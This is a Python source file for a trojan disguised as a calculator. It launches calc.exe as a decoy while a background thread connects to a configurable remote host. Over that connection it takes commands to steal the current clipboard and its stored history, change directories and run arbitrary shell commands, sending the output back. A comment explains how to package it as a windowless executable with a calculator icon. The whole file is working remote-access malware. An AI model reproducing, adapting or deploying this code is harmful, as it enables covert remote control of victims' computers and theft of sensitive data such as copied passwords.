import pickle
import subprocess, socket, threading, time
from tkinter import Tk
import os

# Create executable:
# pyinstaller --onefile calc_trojan_client.py --icon=calc.ico --noconsole

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4321)) # CHANGE IP AND PORT

clipboard_history = []

def openCalc():
    subprocess.run("calc.exe")


def check_clipboard(clip):
    if clip in clipboard_history:
        return True
    return False


def trojan():
    while True:
        command = s.recv(4096).decode()
        print(command)
        if len(command) == 0:
            continue
        if command.lower() == "exit":
            s.close()
            break
        # Send current clipboard
        if command.lower() == "clip":
            clipboard = Tk().clipboard_get()
            if not clipboard:
                s.send("Clipboard empty".encode())
                continue
            if check_clipboard(clipboard):
                s.send("Already sent".encode())
            else:
                clipboard_history.append(clipboard)
                s.send(clipboard.encode())
            continue
        # Converts list to pickle and sends complete clipboard history
        if command.lower() == "clip -all":
            list_to_pickle = pickle.dumps(clipboard_history)
            s.send(list_to_pickle)
            continue
        # Clear clipboard history
        if command.lower() == "clip -clear":
            clipboard_history.clear()
            s.send("Clipboard cleared".encode())
            continue
        # Change the current working directory
        if command.lower().startswith("cd "):
            os.chdir(command.lower()[3:])
            s.send("New directory: ".encode() + os.getcwd().encode())
            continue

        # Run the command on the client and send the response back to the server
        command_to_run = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if command_to_run.returncode == 0 and command_to_run.stdout:
            s.send(command_to_run.stdout)
        else:
            s.send("Not a valid command".encode())


t1 = threading.Thread(target=openCalc)
t2 = threading.Thread(target=trojan)
t1.start()
t2.start()
t1.join()
t2.join()
